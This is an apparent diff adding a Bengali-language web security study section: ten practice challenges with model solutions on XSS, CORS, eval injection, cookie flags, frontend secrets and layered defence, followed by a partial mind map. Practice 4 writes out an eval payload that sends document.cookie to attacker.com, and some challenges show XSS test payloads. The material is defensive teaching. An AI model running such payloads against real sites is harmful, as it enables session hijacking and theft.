+        <div style="background: #f8fafc; border-left: 3px solid #06b6d4; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 6:</strong> Validate input strictly on the server (Client validation is just UX).
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #3b82f6; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 7:</strong> Use HTTPS and HSTS for all communication in production.
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #6366f1; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 8:</strong> Protect session credentials with <code>HttpOnly; Secure; SameSite</code> cookies.
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #8b5cf6; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 9:</strong> Keep dependencies updated, lock versions and audit using <code>npm audit</code>.
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #ec4899; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 10:</strong> Security is layered (Defense-in-Depth), never rely on a single defensive tool.
+        </div>
+      </div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.Lab</span> 📝 Hands-On Practice Lab — 10 Web Security Challenges &amp; Full Model Solutions</div>
+      <p class="text-p">বাস্তব জীবনের প্রোডাকশন সিকিউরিটি ডিফেন্স যাচাই করতে ১০টি ইন্টারভিউ চ্যালেঞ্জের বিস্তারিত ব্যাখ্যা ও সমাধান:</p>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 1: DOM XSS Sinks: innerHTML vs textContent</span>
+          <span style="background: #059669; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Beginner</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ কোনটি safer: element.innerHTML = userInput নাকি element.textContent = userInput? কেন?</p>
+        <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">Practice 1 Security Challenge</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-com">// ❌ Dangerous Sink:</span>
+element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = userInput; <span class="syn-com">// Executes &lt;img src=x onerror=alert(1)&gt;</span>
+
+<span class="syn-com">// ✅ Safe Property:</span>
+element.textContent = userInput; <span class="syn-com">// Encodes characters as harmless plain text</span></code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Plain Text Safe Render</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. 'textContent' শতভাগ নিরাপদ।
+২. কারণ: 'innerHTML' ব্রাউজারের HTML পার্সারকে সক্রিয় করে। যদি userInput-এ ক্ষতিকর স্ক্রিপ্ট বা ইভেন্ট হ্যান্ডলার (যেমন <img src=x onerror=...>) থাকে, তবে ব্রাউজার তা এক্সিকিউট করে ফেলবে (DOM XSS)।
+৩. অপরদিকে, 'textContent' ব্রাউজারের পার্সারকে বাইপাস করে এবং ইনপুটকে খাঁটি স্ট্রিং হিসেবে DOM টেক্সট নোডে ইনসার্ট করে। সব বিশেষ ক্যারেক্টার স্বয়ংক্রিয়ভাবে নিষ্ক্রিয় থাকে।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 2: Authentication vs Authorization Distinction</span>
+          <span style="background: #059669; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Beginner</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ Authentication আর Authorization-এর মূল পার্থক্য কী?</p>
+        <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">Practice 2 Security Challenge</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span class="syn-com">// Authentication (Identity Verification):</span>
+<span class="syn-kw">const</span> isAuthenticated = verifyPassword(user.email, user.password); <span class="syn-com">// &quot;Who are you?&quot;</span>
+
+<span class="syn-com">// Authorization (Permission / Access Control):</span>
+<span class="syn-kw">const</span> isAuthorized = user.role === <span class="syn-str">&quot;admin&quot;</span> &amp;&amp; user.permissions.includes(&quot;DELETE_USER<span class="syn-str">&quot;); // &quot;</span>What are you allowed to <span class="syn-kw">do</span>?&quot;</code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>AuthN: Verified User | AuthZ: Access Granted</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. Authentication (AuthN): এটি ব্যবহারকারীর পরিচয় নিশ্চিত করার প্রক্রিয়া—'তুমি কে?' (e.g. Email+Password, OTP, Biometrics)।
+২. Authorization (AuthZ): পরিচয় নিশ্চিত হওয়ার পর ব্যবহারকারী নির্দিষ্ট কোনো রিসোর্স দেখতে বা পরিবর্তন করতে পারে কি না তা নির্ধারণ করা—'তুমি কী করতে পারো?' (e.g. Admin, Editor, Regular User)।
+৩. সিকিউরিটি নোট: একজন ইউজার লগইন থাকলেই (Authenticated) সে অন্য কারো ডেটা ডিলিট করার অধিকার (Authorized) পায় না।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 3: CORS (Cross-Origin Resource Sharing) Purpose</span>
+          <span style="background: #059669; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Beginner</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ CORS কী সমাধান করে এবং কেন এটি গুরুত্বপূর্ণ?</p>
+        <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">Practice 3 Security Challenge</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-com">// Browser Same-Origin Policy blocks Cross-Origin Fetch by default:</span>
+<span class="syn-fn">fetch</span>(&quot;https://api.bank.com/data&quot;); // Blocked if frontend is https://my-app.com
+
+<span class="syn-com">// Server sends CORS response header to explicitly allow access:</span>
+<span class="syn-com">// Access-Control-Allow-Origin: https://my-app.com</span></code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Cross-Origin Access Allowed by Server</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. ব্রাউজারের Same-Origin Policy (SOP) ডিফল্টভাবে এক অরিজিন থেকে অন্য অরিজিনে JavaScript রিকোয়েস্টের রেসপন্স রিড করতে দেয় না।
+২. CORS হলো একটি মেকানিজম যার মাধ্যমে সার্ভার ব্রাউজারকে নির্দেশ দেয় যে কোন কোন থার্ড-পার্টি অরিজিনকে এই এপিআই-এর রেসপন্স পড়ার অনুমতি দেওয়া যেতে পারে।
+৩. গুরুত্বপূর্ণ সত্য: CORS কোনো সার্ভার-সাইড ফায়ারওয়াল বা অথেনটিকেশন নয়; এটি শুধুমাত্র ব্রাউজারকে প্রটেক্ট করে। Postman বা cURL দিয়ে CORS বাইপাস করা যায়।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 4: eval() Code Injection Vulnerability</span>
+          <span style="background: #d97706; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Intermediate</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ কেন eval(userInput) ব্যবহার করা অত্যন্ত বিপজ্জনক?</p>
+        <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">Practice 4 Security Challenge</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span class="syn-com">// ❌ Extreme Hazard:</span>
+<span class="syn-kw">const</span> userInput = <span class="syn-str">&#x27;fetch(&quot;https://attacker.com/steal?c=&quot; + document.cookie)&#x27;</span>;
+<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">eval</span>(userInput); <span class="syn-com">// Arbitrary Code Executed with Full User Privileges!</span>
+
+<span class="syn-com">// ✅ Safe Alternative:</span>
+<span class="syn-kw">const</span> safeData = <span class="syn-fn">JSON</span>.parse(userInputJson);</code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Malicious Code Injected &amp; Executed</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. 'eval()' পাস করা যেকোনো স্ট্রিংকে সরাসরি পূর্ণাঙ্গ জাভাস্ক্রিপ্ট কোড হিসেবে এক্সিকিউট করে।
+২. যদি কোনো আক্রমণকারী ইনপুটে ক্ষতিকর কোড পাঠায়, তবে এটি বর্তমান ইউজারের সমস্ত অধিকার (Cookies, Session, LocalStorage, DOM) দিয়ে ক্লায়েন্ট মেশিনে রান করবে।
+৩. এটি JIT অপটিমাইজেশন নষ্ট করে পারফরম্যান্স কমায় এবং বিশাল সিকিউরিটি হোল তৈরি করে। আধুনিক জাভাস্ক্রিপ্টে ডেটা পার্সিংয়ের জন্য 'JSON.parse()' ব্যবহার করা উচিত।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 5: Frontend Authorization Bypass Fallacy</span>
+          <span style="background: #d97706; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Intermediate</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ কেন 'if (user.role === "admin") showDeleteButton();' সিকিউরিটির জন্য যথেষ্ট নয়?</p>
+        <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">Practice 5 Security Challenge</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span class="syn-com">// ❌ Frontend-only UI Hiding (False Sense of Security):</span>
+<span class="syn-kw">if</span> (user.role === <span class="syn-str">&quot;admin&quot;</span>) {
+    showDeleteButton();
+}
+
+<span class="syn-com">// ⚠️ Attacker can easily inspect DevTools, unhide the button, or run:</span>
+<span class="syn-fn">fetch</span>(&quot;/api/delete-user/<span class="syn-num">42</span><span class="syn-str">&quot;, { method: &quot;</span>DELETE<span class="syn-str">&quot; });
+
+// ✅ Mandatory Server-side Authorization:
+app.delete(&quot;</span>/api/<span class="syn-kw">delete</span>-user/:id<span class="syn-str">&quot;, verifyToken, requireRole(&quot;</span>admin&quot;), (req, res) =&gt; {
+    <span class="syn-com">// Authorized action executed safely on server</span>
+});</code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Unauthorized Request Blocked with 403 Forbidden</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. ফ্রন্টএন্ড কোড ইউজারের ব্রাউজারে রান হয়, যা আক্রমণকারী সম্পূর্ণভাবে নিয়ন্ত্রণ (Inspect, Modify, Override) করতে পারে।
+২. শুধু বাটন লুকিয়ে রাখা কোনো সিকিউরিটি নয়; আক্রমণকারী সরাসরি নেটওয়ার্ক ট্যাব বা কনসোল দিয়ে API এন্ডপয়েন্টে DELETE রিকোয়েস্ট পাঠিয়ে দিতে পারে।
+৩. সমাধান: প্রতিটি সুরক্ষিত অ্যাকশনের জন্য ব্যাকএন্ড সার্ভারে রোল ও পারমিশন ভ্যালিডেশন (403 Forbidden) থাকা বাধ্যতামূলক।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 6: Production Cookie Security Flags Breakdown</span>
+          <span style="background: #d97706; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Intermediate</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax এর প্রতিটি অংশের ভূমিকা ব্যাখ্যা করো।</p>
+        <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">Practice 6 Security Challenge</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span class="syn-fn">Set</span>-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax</code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Session Cookie Hardened against XSS &amp; CSRF</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. 'sessionId=abc123': সেশন আইডেন্টিফায়ার কি-ভ্যালু পেয়ার।
+২. 'HttpOnly': ক্লায়েন্ট-সাইড জাভাস্ক্রিপ্ট (document.cookie) দিয়ে এই কুকি পড়া বা চুরি করা সম্পূর্ণ বন্ধ করে, যা XSS আক্রমণ থেকে টোকেন রক্ষা করে।
+৩. 'Secure': কুকিটি কেবল এনক্রিপ্টেড HTTPS কানেকশনেই ব্রাউজার সার্ভারে পাঠাবে; সাধারণ আন-এনক্রিপ্টেড HTTP দিয়ে পাঠাবে না (Man-in-the-Middle স্নাইফিং প্রতিরোধ)।
+৪. 'SameSite=Lax': অন্য কোনো ওয়েবসাইট থেকে ক্রস-সাইট রিকোয়েস্ট (e.g. POST/Form submission) পাঠালে ব্রাউজার এই কুকি সংযুক্ত করবে না, যা CSRF আক্রমণ প্রতিরোধ করে।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 7: DOM-Based XSS via URL Parameter Identification & Patch</span>
+          <span style="background: #dc2626; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Advanced 🔥</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ নিচের কোডের সিকিউরিটি সমস্যা চিহ্নিত করো এবং নিরাপদ কোডে রূপান্তর করো:</p>
+        <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">Practice 7 Security Challenge</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-com">// ❌ Vulnerable DOM-based XSS:</span>
+<span class="syn-kw">const</span> query = <span class="syn-fn">location</span>.search; <span class="syn-com">// Attacker sends: ?name=&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="syn-fn">document</span>.<span style="color: #38bdf8; font-weight: 600;">querySelector</span>(&quot;#result<span class="syn-str">&quot;).innerHTML = query;
+
+// ✅ Production Safe Solution:
+const params = new URLSearchParams(location.search);
+const safeQuery = params.get(&quot;</span>name<span class="syn-str">&quot;) || &quot;</span><span class="syn-str">&quot;;
+document.querySelector(&quot;</span>#result&quot;).textContent = safeQuery;</code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Sanitized Safe DOM Insertion</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. সমস্যা: URL প্যারামিটার থেকে সরাসরি 'innerHTML'-এ ডেটা অ্যাসাইন করায় DOM-Based XSS আক্রমণ সম্ভব। আক্রমণকারী ভিকটিমকে ক্ষতিকর প্যারামিটারসহ লিংক পাঠিয়ে সেশন হাইজ্যাক করতে পারে।
+২. সমাধান: 'URLSearchParams' দিয়ে নিরাপদভাবে প্যারামিটার এক্সট্র্যাক্ট করে 'textContent' প্রোপার্টি ব্যবহার করতে হবে। যদি HTML রেন্ডার করতেই হয়, তবে DOMPurify দিয়ে স্যানিটাইজ করে নেওয়া বাধ্যতামূলক।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 8: Comprehensive Defense Comparison: XSS vs CSRF vs CORS</span>
+          <span style="background: #dc2626; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Advanced 🔥</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ XSS, CSRF এবং CORS-এর মূল পার্থক্য ও সম্পর্ক এক নজরে ব্যাখ্যা করো।</p>
+        <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">Practice 8 Security Challenge</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-com">// XSS: Attacker runs arbitrary JavaScript inside victim&#x27;s trusted browser.</span>
+<span class="syn-com">// CSRF: Attacker tricks victim&#x27;s browser into sending an authenticated request to a trusted server.</span>
+<span class="syn-com">// CORS: Browser mechanism to allow or deny cross-origin HTTP responses.</span></code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>XSS = Code Injection | CSRF = Request Forgery | CORS = Browser Origin Restriction</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. XSS (Cross-Site Scripting): ভিকটিমের ব্রাউজারে আক্রমণকারীর কোড রান করায়। প্রতিকার: Input Validation, textContent, DOMPurify, CSP।
+২. CSRF (Cross-Site Request Forgery): আক্রমণকারী ভিকটিমের কুকি ব্যবহার করে না জেনে অন্য সাইটে ট্রানজেকশন করায়। প্রতিকার: SameSite Cookies, Anti-CSRF Tokens, Custom Headers।
+৩. CORS (Cross-Origin Resource Sharing): ব্রাউজারকে ভিন্ন অরিজিন থেকে রেসপন্স পড়ার অনুমতি দেয়। প্রতিকার: সঠিক Access-Control-Allow-Origin সেট করা।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 9: Frontend Secrets Leakage & Reverse Engineering Reality</span>
+          <span style="background: #dc2626; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Advanced 🔥</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ কেন frontend JavaScript কোডে 'const SECRET_API_KEY = "super-secret";' রাখা যাবে না?</p>
+        <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">Practice 9 Security Challenge</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-com">// ❌ Fatal Security Anti-Pattern:</span>
+<span class="syn-kw">const</span> SECRET_STRIPE_KEY = <span class="syn-str">&quot;sk_live_51M...&quot;</span>; <span class="syn-com">// Publicly Visible in Network &amp; Sources tab!</span>
+
+<span class="syn-com">// ✅ Safe Production Architecture:</span>
+<span class="syn-com">// Frontend calls internal backend API -&gt; Backend calls Stripe using Secret Key stored on Server Env.</span></code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Secret Protected Behind Server Proxy</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. ব্রাউজার একটি ওপেন ক্লায়েন্ট এনভায়রনমেন্ট। যেকোনো ইউজার F12 প্রেস করে Sources ট্যাব, নেটওয়ার্ক লগ বা বান্ডল কোড (মিনিফাইড হলেও) রিভার্স-ইঞ্জিনিয়ারিং করে সমস্ত স্ট্রিং পড়ে ফেলতে পারে।
+২. '.env' ফাইলে ফ্রন্টএন্ডে কি রাখলেও তা বিল্ড টাইমে (Webpack/Vite) ক্লায়েন্ট কোডে সরাসরি প্রতিস্থাপিত হয়ে যায়।
+৩. নিয়ম: কোনো প্রাইভেট কী বা ডেটাবেস সিক্রেট কখনো ফ্রন্টএন্ডে রাখা যাবে না। ফ্রন্টএন্ড কেবল নিজস্ব ব্যাকএন্ডের সাথে যোগাযোগ করবে, এবং ব্যাকএন্ড সিক্রেট কি দিয়ে থার্ড পার্টি এপিআই কল করবে।</div>
+        </div>
+      </div>
+      <div class="practice-item">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">Practice 10: End-to-End Enterprise Admin Dashboard Security Architecture</span>
+          <span style="background: #dc2626; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">Advanced 🔥</span>
+        </div>
+        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ একটি সুরক্ষিত অ্যাডমিন ড্যাশবোর্ডের প্রতিটি লেয়ারের সিকিউরিটি মেজার ডিজাইন করো:</p>
+        <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">Practice 10 Security Challenge</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span class="syn-com">// Enterprise Multi-Layer Security Architecture:</span>
+<span class="syn-com">// 1. Transport Layer: HTTPS (TLS 1.3) + HSTS</span>
+<span class="syn-com">// 2. Client Security: CSP + Frame-Ancestors DENY + HttpOnly Cookies</span>
+<span class="syn-com">// 3. Auth Pipeline: bcrypt hashed password + Rate-limited Login + MFA</span>
+<span class="syn-com">// 4. API Layer: JWT Signature Verification + Server-side RBAC + Input Validation</span>
+<span class="syn-com">// 5. Database: Parameterized SQL queries (No Injection) + Principle of Least Privilege</span></code></pre>
+</div>
+        <div class="code-box output-box">
+  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
+  <pre>Zero-Trust Defense-in-Depth Pipeline Active</pre>
+</div>
+        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
+          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
+          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">১. Transport: HTTPS এবং HSTS হেডার দিয়ে ম্যান-ইন-দ্য-মিডল স্নাইফিং বন্ধ করা।
+২. Client/Browser: CSP দিয়ে আন-অথরাইজড স্ক্রিপ্ট এক্সিকিউশন রোধ এবং X-Frame-Options দিয়ে ক্লিকজ্যাকিং প্রতিরোধ।
+৩. Authentication: ব্রুট-ফোর্স আটকাতে এপিআই রেট লিমিটিং, পাসওয়ার্ড হ্যাশিং (argon2/bcrypt) এবং রিফ্রেশ টোকেন রোটেশন।
+৪. Session Management: এক্সেস টোকেন মেমরিতে এবং রিফ্রেশ টোকেন 'HttpOnly; Secure; SameSite=Strict' কুকিতে সংরক্ষণ।
+৫. Authorization & Database: প্রতি এপিআই কলে রোল চেক (Admin Guard) এবং ডেটাবেসে প্যারামিটারাইজড কুয়েরি ব্যবহার।</div>
+        </div>
+      </div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.Map</span> 🎯 Final Mental Map — Global Web Security Architecture</div>
+      <p class="text-p">ব্রাউজার, নেটওয়ার্ক, অ্যাপ্লিকেশন ও ডেটাবেস স্তরের সমন্বিত নিরাপত্তা কাঠামোর মানসিক মানচিত্র:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ Full-Stack Web Security Coordination Tree</div>
+  <pre class="ascii-tree-content">WEB SECURITY
+                         <span style="color: #475569;">│</span>
+       <span style="color: #475569;">┌</span><span style="color: #0ea5e9; font-weight: 600;">─────────────────</span><span style="color: #475569;">┼</span><span style="color: #0ea5e9; font-weight: 600;">─────────────────</span><span style="color: #475569;">┐</span>
+       <span style="color: #475569;">│</span>                 <span style="color: #475569;">│</span>                 <span style="color: #475569;">│</span>
+       <span style="color: #38bdf8; font-weight: 700;">▼</span>                 <span style="color: #38bdf8; font-weight: 700;">▼</span>                 <span style="color: #38bdf8; font-weight: 700;">▼</span>
+   <span style="color: #fde047; font-weight: 600;">Browser</span>            Identity          Network
+   Security           Security          Security
+       <span style="color: #475569;">│</span>                 <span style="color: #475569;">│</span>                 <span style="color: #475569;">│</span>
+       <span style="color: #475569;">├</span>─ <span style="color: #f43f5e; font-weight: 700;"><span style="color: #f43f5e; font-weight: bold;">X</span>SS</span>            <span style="color: #475569;">├</span>─ Auth          <span style="color: #475569;">├</span>─ <span style="color: #34d399; font-weight: 700;">HTTPS</span>
+       <span style="color: #475569;">├</span>─ <span style="color: #34d399; font-weight: 700;">CSP</span>            <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Authorization</span> <span style="color: #475569;">├</span>─ <span style="color: #fde047; font-weight: 600;">CORS</span>
+       <span style="color: #475569;">├</span>─ <span style="color: #34d399; font-weight: 700;">SOP</span>            <span style="color: #475569;">├</span>─ Cookies       <span style="color: #475569;">├</span>─ <span style="color: #f43f5e; font-weight: 700;">CSRF</span>
+       <span style="color: #475569;">├</span>─ DOM Security  <span style="color: #475569;">└</span>─ <span style="color: #fde047; font-weight: 600;">JWT</span>            <span style="color: #475569;">└</span>─ Headers
+       <span style="color: #475569;">│</span>
+       <span style="color: #38bdf8; font-weight: 700;">▼</span>
+   Input Security
+       <span style="color: #475569;">│</span>
+       <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Validation</span>
+       <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Sanitization</span>
+       <span style="color: #475569;">├</span>─ Encoding
+       <span style="color: #475569;">└</span>─ <span style="color: #34d399; font-weight: 700;">Safe</span> DOM APIs
+                         <span style="color: #475569;">│</span>
+                         <span style="color: #38bdf8; font-weight: 700;">▼</span>
+                  Application Security
+                         <span style="color: #475569;">│</span>
+              <span style="color: #475569;">┌</span><span style="color: #0ea5e9; font-weight: 600;">──────────</span><span style="color: #475569;">┼</span><span style="color: #0ea5e9; font-weight: 600;">──────────</span><span style="color: #475569;">┐</span>
+              <span style="color: #38bdf8; font-weight: 700;">▼</span>          <span style="color: #38bdf8; font-weight: 700;">▼</span>          <span style="color: #38bdf8; font-weight: 700;">▼</span>
+           <span style="color: #fde047; font-weight: 600;">API</span>         <span style="color: #fde047; font-weight: 600;">Database</span>   Dependencies
+              <span style="color: #475569;">│</span>
